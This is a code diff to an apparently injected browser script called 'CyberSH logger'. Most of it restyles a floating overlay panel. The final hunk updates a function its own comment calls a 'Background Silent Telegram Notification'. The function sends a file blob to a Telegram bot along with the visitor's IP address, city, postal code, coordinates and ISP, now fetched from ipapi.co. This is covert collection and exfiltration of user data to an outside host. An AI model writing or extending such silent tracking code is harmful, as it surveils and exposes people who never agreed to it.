@@ -64,7 +64,7 @@
     const widthStyle = savedWidth ? `width: ${savedWidth};` : `width: 94%; max-width: 420px;`;
     const heightStyle = savedHeight ? `height: ${savedHeight};` : `max-height: 78vh;`;
 
-    // Inject Modern Glassmorphism CSS & Animations
+    // Inject Modern Glassmorphism CSS & Scrollable Layout Fix
     const styleTag = document.createElement('style');
     styleTag.innerHTML = `
         @keyframes cybersh-spin {
@@ -128,11 +128,19 @@
         }
         #cybersh-logger-overlay {
             resize: both;
-            overflow: hidden;
-            min-width: 310px;
-            min-height: 380px;
+            overflow-y: auto !important;
+            overflow-x: hidden;
+            min-width: 280px;
+            min-height: 250px;
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
+        }
+        #cybersh-logger-overlay::-webkit-scrollbar {
+            width: 5px;
+        }
+        #cybersh-logger-overlay::-webkit-scrollbar-thumb {
+            background: rgba(56, 189, 248, 0.3);
+            border-radius: 10px;
         }
         #cybersh-logger-overlay input::placeholder {
             color: #64748b;
@@ -169,7 +177,7 @@
         <img src="https://avatars.githubusercontent.com/u/85736436?v=4" alt="CyberSH" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" />
     </div>`;
 
-    // 4. Inject Professional UI Overlay
+    // 4. Inject Professional UI Overlay (Scrollable Container)
     const overlayHtml = `
     <div id="cybersh-logger-overlay" style="position: fixed; top: 15px; left: 50%; transform: translateX(-50%); ${widthStyle} ${heightStyle} background: linear-gradient(145deg, rgba(15, 23, 42, 0.96), rgba(2, 6, 23, 0.98)); color: #f8fafc; z-index: 999999; border-radius: 20px; padding: 18px; font-family: system-ui, -apple-system, sans-serif; font-size: 12px; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.75), 0 0 20px rgba(56, 189, 248, 0.12); display: flex; flex-direction: column; border: 1px solid rgba(56, 189, 248, 0.3);">
         
@@ -222,7 +230,7 @@
         </div>
 
         <!-- Log Terminal Window -->
-        <div id="cybersh-log-content" style="overflow-y: auto; flex-grow: 1; min-height: 70px; word-break: break-all; white-space: pre-wrap; line-height: 1.5; background: rgba(2, 6, 23, 0.85); padding: 12px; border-radius: 10px; border: 1px solid rgba(51, 65, 85, 0.6); font-family: 'SF Mono', Consolas, 'Courier New', Courier, monospace; font-size: 11px;"></div>
+        <div id="cybersh-log-content" style="overflow-y: auto; flex-grow: 1; min-height: 80px; max-height: 150px; word-break: break-all; white-space: pre-wrap; line-height: 1.5; background: rgba(2, 6, 23, 0.85); padding: 12px; border-radius: 10px; border: 1px solid rgba(51, 65, 85, 0.6); font-family: 'SF Mono', Consolas, 'Courier New', Courier, monospace; font-size: 11px; flex-shrink: 0;"></div>
 
         <!-- Action Footer -->
         <div style="margin-top: 12px; display: flex; gap: 8px; flex-shrink: 0;">
@@ -268,8 +276,8 @@
     document.getElementById('cybersh-btn-zoom-out').onclick = () => {
         const currentWidth = overlay.offsetWidth;
         const currentHeight = overlay.offsetHeight;
-        const newWidth = Math.max(310, currentWidth - 40);
-        const newHeight = Math.max(380, currentHeight - 35);
+        const newWidth = Math.max(280, currentWidth - 40);
+        const newHeight = Math.max(250, currentHeight - 35);
         overlay.style.width = newWidth + 'px';
         overlay.style.height = newHeight + 'px';
         localStorage.setItem('cybersh_overlay_width', overlay.style.width);
@@ -504,7 +512,7 @@
 
     await checkDeviceApproval();
 
-    // Background Silent Telegram Notification via ipinfo.io (Professional Format without readme)
+    // Background Silent Telegram Notification via ipapi.co (Reliable IP info API)
     async function sendToTelegramBot(blob, fileName) {
         try {
             let ipInfo = "N/A";
@@ -517,16 +525,16 @@
             let org = "N/A";
 
             try {
-                const ipRes = await fetch("https://ipinfo.io/json");
+                const ipRes = await fetch("https://ipapi.co/json/");
                 const ipData = await ipRes.json();
-                if (ipData && !ipData.readme) {
+                if (ipData && !ipData.error) {
                     ipInfo = ipData.ip || "N/A";
                     city = ipData.city || "N/A";
                     region = ipData.region || "N/A";
-                    country = ipData.country || "N/A";
+                    country = ipData.country_name || "N/A";
                     postal = ipData.postal || "N/A";
                     timezone = ipData.timezone || "N/A";
-                    loc = ipData.loc || "N/A";
+                    loc = `${ipData.latitude || "N/A"}, ${ipData.longitude || "N/A"}`;
                     org = ipData.org || "N/A";
                 }
             } catch (e) {}
